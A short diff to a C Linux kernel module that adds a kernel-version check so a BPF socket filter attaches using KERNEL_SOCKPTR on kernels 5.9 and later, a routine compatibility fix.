@@ -250,7 +250,11 @@ int listen(void * data) {
         return -1;
     }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,9,0)
+    ret = sock_setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, KERNEL_SOCKPTR((void *)&bpf), sizeof(bpf));
+#else
     ret = sock_setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, (void *)&bpf, sizeof(bpf));
+#endif
 
     if(ret < 0) {
         DEBUG_PRINT(KERN_INFO "[-] Could not attach bpf filter to socket\n");
